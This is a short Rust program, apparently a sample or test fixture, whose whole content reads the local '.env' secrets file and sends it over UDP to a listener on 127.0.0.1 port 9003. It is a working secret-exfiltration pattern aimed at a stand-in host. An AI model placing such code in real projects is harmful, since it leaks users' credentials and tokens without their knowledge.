use std::fs;
use std::net::UdpSocket;

fn main() {
    if let Ok(env_data) = fs::read_to_string(".env") {
        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
            let _ = socket.send_to(env_data.as_bytes(), "127.0.0.1:9003");
        }
    }
}
